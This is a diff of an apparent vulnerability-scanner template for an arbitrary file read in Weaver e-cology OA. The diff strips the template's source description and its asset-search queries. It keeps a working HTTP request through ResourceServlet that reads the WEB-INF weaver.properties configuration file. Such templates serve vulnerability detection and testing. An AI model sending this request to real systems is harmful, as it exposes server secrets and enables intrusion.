@@ -3,12 +3,8 @@ info:
   name: 泛微-ecology-任意文件读取-ResourceServlet
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ubokywvdx0uqyosa'
+  description: ''
   tags: rce,lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ubokywvdx0uqyosa
-    fofa: app="泛微-EOffice"||app="泛微-OA（e-cology）" 或 Hunter:app.name="泛微 e-cology OA"
 http:
 - raw:
   - 'GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
